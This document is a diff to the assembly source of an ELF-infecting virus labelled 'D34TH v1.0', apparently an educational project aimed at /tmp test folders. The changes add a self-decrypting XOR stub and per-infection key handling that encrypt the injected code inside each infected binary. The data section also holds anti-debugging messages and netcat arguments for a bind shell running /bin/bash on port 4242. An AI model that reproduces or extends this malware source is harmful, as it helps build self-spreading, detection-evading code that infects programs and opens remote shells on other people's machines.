@@ -3,8 +3,10 @@
 section .text
 
 _start:
+; TODO begin transformable section
 	nop
 	; https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
+
 begin:
 	; save all registers
 	push rax
@@ -18,6 +20,60 @@ begin:
 	push r10
 	push r11
 
+	; uncipher first part of the code
+	lea rdi, [rel program_entry]			; data = &program_entry
+	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
+	lea rdx, [rel key]				; key = key
+	mov rcx, [rel key_size]				; key_size = key_size
+	cmp rcx, 0					; if (key_size == 0)
+	je program_entry				; 	goto program_entry
+	call xor_cipher					; xor_cipher(data, size, key, key_size)
+
+	jmp program_entry				; goto program_entry
+
+; void xor_cipher(char *data, int size, char *key, int key_size);
+; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
+xor_cipher:
+	push rcx					; save key_size
+	push rdx					; save key
+
+	.loop:
+		cmp rsi, 0				; if (size == 0)
+		je .end					; 	goto .end
+
+		mov al, [rdi]				; al = *data
+		mov bl, [rdx]				; bl = *key
+		xor al, bl				; al ^= bl
+		mov [rdi], al				; *data = al
+
+		inc rdi					; data++
+		inc rdx					; key++
+		dec rsi					; size--
+		dec rcx					; key_size--
+
+		cmp rcx, 0				; if (key_size == 0)
+		je .key_reset				; 	goto .key_reset
+
+		jmp .loop				; goto .loop
+
+	.key_reset:
+		mov rdx, [rsp]				; restore key
+		mov rcx, [rsp + 8]			; ...
+		jmp .loop				; goto .loop
+
+	.end:
+		pop rdx					; reset stack
+		pop rcx					; ...
+		ret					; return
+; TODO end transformable section
+
+key: times KEY_SIZE dq 0x0
+key_size: dq 0x0
+clean: db 0x0
+signature: db "D34TH v1.0 by jmaia and dhubleur - "
+fingerprint_str: db "0000000000", 0
+
+program_entry:
 	%push context
 	%stacksize flat64
 	%assign %$localsize 0
@@ -337,41 +393,6 @@ print_string:
 
 	ret
 
-; void xor_cipher(char *data, int size, char *key, int key_size);
-; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
-xor_cipher:
-	push rcx					; save key_size
-	push rdx					; save key
-
-	.loop:
-		cmp rsi, 0				; if (size == 0)
-		je .end					; 	goto .end
-
-		mov al, [rdi]				; al = *data
-		mov bl, [rdx]				; bl = *key
-		xor al, bl				; al ^= bl
-		mov [rdi], al				; *data = al
-
-		inc rdi					; data++
-		inc rdx					; key++
-		dec rsi					; size--
-		dec rcx					; key_size--
-
-		cmp rcx, 0				; if (key_size == 0)
-		je .key_reset				; 	goto .key_reset
-
-		jmp .loop				; goto .loop
-
-	.key_reset:
-		mov rdx, [rsp]				; restore key
-		mov rcx, [rsp + 8]			; ...
-		jmp .loop				; goto .loop
-
-	.end:
-		pop rdx					; reset stack
-		pop rcx					; ...
-		ret					; return
-
 ; void decompression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
 ; void decompression(rdi compressed_data_size_ptr, rsi compressed_data_ptr);
 decompression:
@@ -480,8 +501,6 @@ infected_folder_2: db "/tmp/test2/", 0
 elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 len_elf_64_magic: equ $ - elf_64_magic
 compressed_data_size2: dq 0x00				; Filled in infected
-key: times KEY_SIZE dq 0x00
-key_size: equ $ - key
 debugged_message: db "DEBUG DETECTED ;)", 0
 process_message: db "Process detected ;)", 0
 dev_null: db "/dev/null", 0
@@ -492,14 +511,10 @@ nc_arg3: db "-p", 0
 nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
-magic_key: db 0xf0, 0xe8, 0x3d, 0xae, 0x04, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0xd6, 0x32, 0xf6, 0x48, 0x79, 0x5f
-db 0x1a, 0x9a, 0x4b, 0x83, 0xf8, 0xb9, 0x2c, 0x67, 0xe8, 0x82, 0xe8, 0x4a, 0x02, 0x48, 0x83, 0x13
-db 0x2f, 0xe4, 0xfc
+magic_key: db 0xf0, 0xe8, 0x3d, 0xfd, 0x03, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0x24, 0x32, 0xf6, 0x48, 0x79, 0x5f
+db 0x1a, 0xcc, 0xb6, 0x7c, 0x07, 0x48, 0xf7, 0x6a, 0xfa, 0x7d, 0xff, 0xff, 0xe8, 0xc3, 0x7d, 0x07
+db 0xfe, 0x9f, 0x40
 magic_key_size: equ $ - magic_key
-; never used but here to be copied in the binary
-clean: db 0x0
-signature: db "Death v1.0 by jmaia and dhubleur - "
-fingerprint_str: db "0000000000", 0
 fingerprint_int: dd 0
 ; END FAKE .data SECTION
 
@@ -967,6 +982,12 @@ treat_file:
 	mov rsi, [rand_index]				; ...
 	call generate_key				; ...
 
+	; set key_size in injected code
+	mov rdi, [mappedfile]				; _key_size_ptr = file_map
+	add rdi, [filesize]				; 	+ filesize
+	add rdi, key_size - _start			; 	+ (key_size - _start)
+	mov qword [rdi], KEY_BYTE_SIZE			; *_key_size_ptr = KEY_BYTE_SIZE;
+
 	; xor cipher all injected bytes between infection_routine and _end
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _start);
 	add rdi, [filesize]				;
@@ -975,7 +996,18 @@ treat_file:
 	mov rdx, [mappedfile]				; key = file_map
 	add rdx, [filesize]				; 	+ filesize
 	add rdx, key - _start				; 	+ (key - _start)
-	mov rcx, key_size				; key_size = key_size;
+	mov qword rcx, KEY_BYTE_SIZE			; key_size = KEY_BYTE_SIZE;
+	call xor_cipher					; xor_cipher(data, size, key, key_size)
+
+	;xor cipher all injected bytes between program_entry and infection_routine
+	mov rdi, [mappedfile]				; data = file_map + filesize + (program_entry - _start);
+	add rdi, [filesize]				;
+	add rdi, program_entry - _start			;
+	mov rsi, infection_routine - program_entry	; size = infection_routine - program_entry
+	mov rdx, [mappedfile]				; key = file_map
+	add rdx, [filesize]				; 	+ filesize
+	add rdx, key - _start				; 	+ (key - _start)
+	mov qword rcx, KEY_BYTE_SIZE			; key_size = KEY_BYTE_SIZE;
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
 
@@ -1507,7 +1539,7 @@ rand:
 generate_key:
 	xor r8, r8					; counter = 0
 	.generate_loop:
-		cmp r8, KEY_SIZE*8			; if (counter == 80)
+		cmp r8, KEY_BYTE_SIZE			; if (counter == 80)
 		je .end					;	goto .end;
 
 		push rdx				; save_buf = buf;
